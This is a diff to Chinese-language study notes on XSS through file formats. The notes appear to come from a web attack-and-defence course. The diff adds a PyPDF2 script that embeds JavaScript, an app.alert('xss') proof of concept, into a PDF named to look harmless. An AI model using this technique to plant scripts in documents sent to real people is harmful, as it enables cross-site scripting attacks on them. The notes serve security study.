@@ -39,6 +39,24 @@ SVG(Scalable Vector Graphics)是一种基于XML的二维矢量图格式，和我
 3、直链地址访问后被触发
 
 借助PDF进行XSS漏洞攻击#https://blog.csdn.net/qq_48201589/article/details/135856195
+脚本
+```python
+from PyPDF2 import PdfReader,PdfWriter
+
+  
+
+new_PDF = PdfWriter()
+
+# 写入JavaScript代码
+
+new_PDF.add_js("app.alert('xss');")
+
+f = open("E:/BaiduNetdiskDownload/060-Web攻防-XSS跨站&文件格式&复现打包源码等/xsshtml/没有危害的PDF.pdf","wb")
+
+new_PDF.write(f)
+
+f.close()
+```
 
 项目：迅捷PDF编辑器试用版
 
